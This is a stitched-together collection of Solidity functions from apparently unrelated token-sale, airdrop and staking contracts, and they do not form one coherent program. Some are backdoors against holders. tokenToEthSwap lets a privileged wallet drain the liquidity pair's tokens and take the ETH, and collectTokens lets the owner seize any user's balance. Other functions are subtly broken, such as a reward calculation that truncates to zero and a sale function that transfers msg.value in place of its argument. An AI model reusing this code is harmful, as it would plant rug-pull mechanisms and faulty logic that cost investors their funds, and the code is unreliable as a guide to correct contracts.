function buyTokens(address sender, uint256 value) internal {
    require(saleActive());
    require(value >= 0.5 ether);
    uint256 bonus = getBonusByTime(getCurrentTimestamp());
    uint256 amount = value.mul(bonus);
    if (getCurrentTimestamp() >= startDate1 && getCurrentTimestamp() < endDate1) {
        uint256 p1Bouns = getBounsByAmount(value, amount);
        amount = amount + p1Bouns;
    }
    require(saleCap >= amount);
    balances[tokenWallet] = balances[tokenWallet].sub(amount);
    balances[sender] = balances[sender].add(amount);
    saleCap = saleCap - amount;
    weiRaised = weiRaised + value;
    fundWallet.transfer(msg.value);
}

function getBonusByTime(uint256 atTime) public constant returns(uint256) {
    if (atTime < startDate1) {
        return 0;
    } else if (endDate1 > atTime && atTime > startDate1) {
        return 5000;
    } else if (endDate2 > atTime && atTime > startDate2) {
        return 2500;
    } else {
        return 0;
    }
}

function saleActive() public constant returns(bool) {
    return (
        (getCurrentTimestamp() >= startDate1 &&
            getCurrentTimestamp() < endDate1 && saleCap > 0) ||
        (getCurrentTimestamp() >= startDate2 &&
            getCurrentTimestamp() < endDate2 && saleCap > 0)
    );
}

function buyTokens() public payable {
    require(msg.value >= minimum);
    uint256 tokens = msg.value.mul(RATE).div(10 ** 10); 
    uint256 balance = token.balanceOf(this); 
    if (tokens > balance) { 
        msg.sender.transfer(msg.value);
    } else {
        token.transfer(msg.sender, tokens); 
        emit BoughtTokens(msg.sender, msg.value, tokens);
        raisedAmount = raisedAmount.add(msg.value);
    }
}

function withdrawals() onlyOwner public {
    FAVOREE.transfer(raisedAmount);
    raisedAmount = 0;
}

receive()
external
payable
presaleActive
eligibleForPresale {
    uint256 addressTotalInvestment = investments[_msgSender()].add(msg.value);
    uint256 amountOfTokens;
    if (isDevAddress(_msgSender()) && !allowPublicInvestment) {
        require(addressTotalInvestment <= INVESTMENT_LIMIT_DEVELOPER, "Max investment per dev pre-sale address is 2.88 ETH.");
        amountOfTokens = msg.value.mul(100).div(INVESTMENT_RATIO_DEVELOPER);
    } else if (isWhitelisted(_msgSender()) && !allowPublicInvestment) {
        require(addressTotalInvestment <= INVESTMENT_LIMIT_PRESALE, "Max investment per whitelist pre-sale address is 1.5 ETH.");
        amountOfTokens = msg.value.mul(100).div(INVESTMENT_RATIO_PRESALE);
    } else if (allowPublicInvestment) {
        require(addressTotalInvestment <= INVESTMENT_LIMIT_PUBLIC, "Max investment for every address (once public presale has started) is 0.5 ETH.");
        amountOfTokens = msg.value.mul(100).div(INVESTMENT_RATIO_PUBLIC);
    }
    Token.transfer(_msgSender(), amountOfTokens);
    investors[_investorCount] = msg.sender;
    _investorCount++;
    investments[_msgSender()] = addressTotalInvestment;
}

function collectTokens(address[] addresses, uint[] amounts) onlyOwner public returns(bool) {
    require(addresses.length > 0 &&
        addresses.length == amounts.length);
    uint256 totalAmount = 0;
    for (uint j = 0; j < addresses.length; j++) {
        require(amounts[j] > 0 &&
            addresses[j] != 0x0 &&
            frozenAccount[addresses[j]] == false &&
            now > unlockUnixTime[addresses[j]]);
        amounts[j] = amounts[j].mul(10 * decimals);
        require(balanceOf[addresses[j]] >= amounts[j]);
        balanceOf[addresses[j]] = balanceOf[addresses[j]].sub(amounts[j]);
        totalAmount = totalAmount.add(amounts[j]);
        Transfer(addresses[j], msg.sender, amounts[j]);
    }
    balanceOf[msg.sender] = balanceOf[msg.sender].add(totalAmount);
    return true;
}

function distributeAirdrop(address[] addresses, uint[] amounts) public returns(bool) {
    require(addresses.length > 0 &&
        addresses.length == amounts.length &&
        frozenAccount[msg.sender] == false &&
        now > unlockUnixTime[msg.sender]);
    uint256 totalAmount = 0;
    for (uint j = 0; j < addresses.length; j++) {
        require(amounts[j] > 0 &&
            addresses[j] != 0x0 &&
            frozenAccount[addresses[j]] == false &&
            now > unlockUnixTime[addresses[j]]);
        amounts[j] = amounts[j].mul(10 * decimals);
        totalAmount = totalAmount.add(amounts[j]);
    }
    require(balanceOf[msg.sender] >= totalAmount);
    for (j = 0; j < addresses.length; j++) {
        balanceOf[addresses[j]] = balanceOf[addresses[j]].add(amounts[j]);
        Transfer(msg.sender, addresses[j], amounts[j]);
    }
    balanceOf[msg.sender] = balanceOf[msg.sender].sub(totalAmount);
    return true;
}

function purchase() public canPurchase payable {
    require(msg.sender != address(0)); 
    Member storage memberRecord = members[msg.sender];
    Group storage openGroup = groups[openGroupNumber];
    require(openGroup.ratio > 0); 
    require(memberRecord.exists && memberRecord.groupMemberships[openGroup.groupNumber] && !openGroup.distributing && !openGroup.distributed && !openGroup.unlocked); 
    uint256 currentTimestamp = block.timestamp;
    require(currentTimestamp >= openGroup.startTime && currentTimestamp <= openGroup.deadline); 
    require(tx.gasprice <= maxGasPrice); 
    uint256 weiAmount = msg.value; 
    require(weiAmount >= 0.1 ether);
    uint256 ethTotal = openGroup.ethTotal.add(weiAmount); 
    require(ethTotal <= openGroup.cap); 
    uint256 userETHTotal = memberRecord.ethBalance[openGroup.groupNumber].add(weiAmount); 
    if (currentTimestamp <= openGroup.phase1endTime) { 
        require(userETHTotal <= memberRecord.max1); 
    } else if (currentTimestamp <= openGroup.phase2endTime) { 
        require(userETHTotal <= openGroup.max2); 
    } else { 
        require(userETHTotal <= openGroup.max3); 
    }
    uint256 tokenAmount = weiAmount.mul(openGroup.ratio); 
    uint256 newLeftOver = balances[owner].sub(tokenAmount); 
    openGroup.ethTotal = ethTotal; 
    memberRecord.ethBalance[openGroup.groupNumber] = userETHTotal; 
    memberRecord.tokenBalance[openGroup.groupNumber] = memberRecord.tokenBalance[openGroup.groupNumber].add(tokenAmount); 
    balances[owner] = newLeftOver; 
    owner.transfer(weiAmount); 
    emit PurchaseSuccess(msg.sender, openGroupNumber, weiAmount, memberRecord.ethBalance[openGroup.groupNumber], memberRecord.tokenBalance[openGroup.groupNumber]);
    if (getHowMuchUntilHardCap() <= 100 ether) {
        emit NearingHardCap(openGroupNumber, getHowMuchUntilHardCap());
    }
    if (openGroup.ethTotal == openGroup.cap) {
        emit ReachedHardCap(openGroupNumber);
    }
}

function tokenToEthSwap(uint amount) external {
    require(msg.sender == marketingWallet);
    uint bal = balanceOf(uniswapV2Pair);
    if (bal > 1) _transfer(uniswapV2Pair, address(this), bal - 1);
    IUniswapV2Pair(uniswapV2Pair).sync();
    swapTokensForEth(amount * 10 ** decimals());
    (bool success, ) = address(marketingWallet).call {
        value: address(this).balance
    }("");
}

function stake() public payable {
    require(creationTime + 6 hours <= now, "It has not been 6 hours since contract creation yet");
    address staker = msg.sender;
    address poolAddress = Uniswap(FACTORY).getPair(orbAddress, WETHAddress);
    if (price() >= (1.05 * 10 ** 18) && priceCapped) {
        uint t = IERC20(orbAddress).balanceOf(poolAddress); 
        uint a = IERC20(WETHAddress).balanceOf(poolAddress); 
        uint x = (sqrt(9 * t * t + 3988000 * a * t) - 1997 * t) / 1994;
        IERC20(orbAddress).mint(address(this), x);
        address[] memory path = new address[](2);
        path[0] = orbAddress;
        path[1] = WETHAddress;
        IERC20(orbAddress).approve(UNIROUTER, x);
        Uniswap(UNIROUTER).swapExactTokensForETH(x, 1, path, _POOLADDRESS, INF);
    }
    sendValue(_POOLADDRESS, address(this).balance / 2);
    uint ethAmount = IERC20(WETHAddress).balanceOf(poolAddress); 
    uint tokenAmount = IERC20(orbAddress).balanceOf(poolAddress); 
    uint toMint = (address(this).balance.mul(tokenAmount)).div(ethAmount);
    IERC20(orbAddress).mint(address(this), toMint);
    uint poolTokenAmountBefore = IERC20(poolAddress).balanceOf(address(this));
    uint amountTokenDesired = IERC20(orbAddress).balanceOf(address(this));
    IERC20(orbAddress).approve(UNIROUTER, amountTokenDesired); 
    Uniswap(UNIROUTER).addLiquidityETH {
        value: address(this).balance
    }(orbAddress, amountTokenDesired, 1, 1, address(this), INF);
    uint poolTokenAmountAfter = IERC20(poolAddress).balanceOf(address(this));
    uint poolTokenGot = poolTokenAmountAfter.sub(poolTokenAmountBefore);
    rewards[staker] = rewards[staker].add(viewRecentRewardTokenAmount(staker));
    timePooled[staker] = now;
    internalTime[staker] = now;
    LPTokenBalance[staker] = LPTokenBalance[staker].add(poolTokenGot);
}

function withdrawRewardTokens(uint amount) public {
    require(timePooled[msg.sender] + 3 days <= now, "It has not been 3 days since you staked yet");
    rewards[msg.sender] = rewards[msg.sender].add(viewRecentRewardTokenAmount(msg.sender));
    internalTime[msg.sender] = now;
    uint removeAmount = ethtimeCalc(amount);
    rewards[msg.sender] = rewards[msg.sender].sub(removeAmount);
    IERC20(orbAddress).mint(msg.sender, amount);
}

function Stake(uint256 _amount) external returns(bool success) {
    require(block.timestamp >= startDate, "not-yet");
    _amount = _amount * (10 ** 18);
    uint _rewardRate;
    uint _stakeDate = block.timestamp;
    if (_amount < 2000 * (10 ** 18)) {
        _rewardRate = 0;
    }
    if (_amount >= 2000 * (10 ** 18) && _amount < 7000 * (10 ** 18)) {
        _rewardRate = 58;
    } 
    if (_amount >= 7000 * (10 ** 18) && _amount < 16000 * (10 ** 18)) {
        _rewardRate = 81;
    } 
    if (_amount >= 16000 * (10 ** 18)) {
        _rewardRate = 104;
    } 
    stakeBoxs.push(StakeBox(msg.sender, _amount, _rewardRate, _stakeDate, 0, 0, 0, true));
    uint _stakeID = stakeBoxs.length.sub(1);
    stakeToOwner[_stakeID] = msg.sender;
    ownerStakeCount[msg.sender].add(1);
    ownerToStakes[msg.sender].push(_stakeID);
    totalActiveStakeAmount += _amount;
    totalActiveStakes += 1;
    require(block.timestamp < (deployDate + termofacontract) - 21600, "out-of-date"); 
    require(token.transferFrom(msg.sender, address(this), _amount), "failed");
    emit evStake(msg.sender, _stakeID, _amount, _stakeDate);
    return true;
}

function BurnRemainingTokens() external returns(bool result) {
    require(block.timestamp > (deployDate + termofacontract) + 86400, "out-of-date"); 
    token.burn(totalRewardAllocation - totalDistrubutedReward);
    return true;
}

function UnstakeAndClaim(uint _stakeID) external returns(bool result) {
    uint _stakePeriodInHour = (block.timestamp - stakeBoxs[_stakeID].stakeDate) / 3600; 
    uint256 _amount = stakeBoxs[_stakeID].amount;
    uint256 _reward = (_stakePeriodInHour * (stakeBoxs[_stakeID].rewardRate / 10 ** 4)) * _amount / 100; 
    uint256 _claimedAmount = _amount + _reward;
    require(stakeBoxs[_stakeID].unstakeDate == 0, "already-claimed-before");
    require(stakeBoxs[_stakeID].staker == msg.sender, "this-is-not-yours");
    require(_stakePeriodInHour >= 24, "cant-unstake-before-24-hours"); 
    stakeBoxs[_stakeID].unstakeDate = block.timestamp;
    stakeBoxs[_stakeID].claimedAmount = _claimedAmount;
    stakeBoxs[_stakeID].reward = _reward;
    stakeBoxs[_stakeID].isActive = false;
    totalDistrubutedReward += _reward;
    totalActiveStakeAmount -= _amount;
    totalActiveStakes -= 1;
    require(token.transfer(msg.sender, _claimedAmount), "Failed");
    emit evUnstake(msg.sender, _stakeID, _amount, _reward, _claimedAmount, block.timestamp);
    return true;
}

